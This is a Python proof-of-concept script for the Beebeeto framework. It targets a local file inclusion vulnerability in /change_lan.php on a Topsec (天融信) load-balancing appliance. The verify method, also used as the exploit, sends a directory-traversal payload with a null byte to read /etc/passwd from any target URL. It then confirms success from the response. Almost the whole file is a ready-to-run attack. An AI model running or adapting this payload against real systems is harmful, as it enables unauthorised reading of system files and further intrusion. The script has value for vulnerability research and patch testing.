#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0136',
            'name': '天融信负载均衡系统 /change_lan.php 本地文件包含漏洞 POC',
            'author': '1024',
            'create_date': '2015-09-08',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '天融信',
            'vul_version': ['*'],
            'type': 'Local File Inclusion',
            'tag': ['topsec本地文件包含漏洞', '/change_lan.php漏洞', 'php'],
            'desc': 'N/A',
            'references': ['http://wooyun.org/bugs/wooyun-2015-0118464',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        verify_url = url + '/change_lan.php?LanID=../../../../../../../../../etc/passwd%00'
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        content = req.content
        if ':/bin/' in content and 'Event.observe(window' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())